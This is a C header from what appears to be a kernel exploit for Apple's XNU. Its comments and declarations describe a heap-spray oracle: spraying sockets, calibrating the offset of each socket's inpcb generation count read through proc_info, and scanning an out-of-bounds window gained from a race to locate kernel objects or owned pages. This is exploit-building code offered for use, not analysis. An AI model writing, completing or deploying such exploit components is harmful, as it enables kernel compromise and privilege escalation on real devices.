// ds_oracle.h — socket spray + inpcb identification + marked search arena
//
// after the race gives you the physical page next to page0 of the racing mapping,
// you still don't know *what* is there. the answer is sprayed sockets: every live
// socket has an inpcb whose insi_gencnt is unique and readable from userspace via
// proc_info(PROC_PIDFILEPORTINFO). scan the OOB window for one of those qwords and
// you know exactly which socket you are sitting on.
//
// the arena does the same job for our own pages: 8 huge mappings, one unique marker
// per page. a marker in the OOB window proves physical adjacency with a page we own.
#ifndef DS_ORACLE_H
#define DS_ORACLE_H

#include <stdint.h>
#include <stddef.h>
#include <mach/mach.h>

#define DS_MAX_SOCKS       2048
#define DS_ARENA_CHUNK     (64ULL * 1024 * 1024)
#define DS_ARENA_CHUNKS    8
#define DS_ARENA_MARKER    0x44534d4b00000000ULL   // 'DSMK'

typedef struct {
    int          fd;
    mach_port_t  fileport;
    uint64_t     gencnt;
} ds_sock;

typedef struct {
    mach_vm_address_t base[DS_ARENA_CHUNKS];
    size_t            size[DS_ARENA_CHUNKS];
    int               chunks;
    uint64_t          pages;
} ds_arena;

// proc_info(PROC_INFO_CALL_PIDFILEPORTINFO) gives back a socket_fdinfo blob.
// gencnt lives inside in_sockinfo, and its offset moves between builds — so we
// calibrate it: three fresh sockets, take the qword offsets that differ and climb
// in creation order. no hardcoded struct layout.
int  ds_oracle_calibrate(size_t *gencnt_offset_out);

int  ds_oracle_spray(ds_sock *socks, int n, size_t gencnt_offset);
void ds_oracle_release(ds_sock *socks, int n);

// walks buf as qwords looking for any sprayed gencnt.
// returns 1 and fills idx/off when a socket's inpcb sits in the window.
int  ds_oracle_find(const void *buf, size_t len, const ds_sock *socks, int n,
                    int *idx_out, size_t *off_out);

int  ds_arena_init(ds_arena *a, size_t chunk_size, int chunks);
// returns the page index whose marker was found, or -1
long ds_arena_scan(const void *buf, size_t len);
void ds_arena_free(ds_arena *a);

#endif
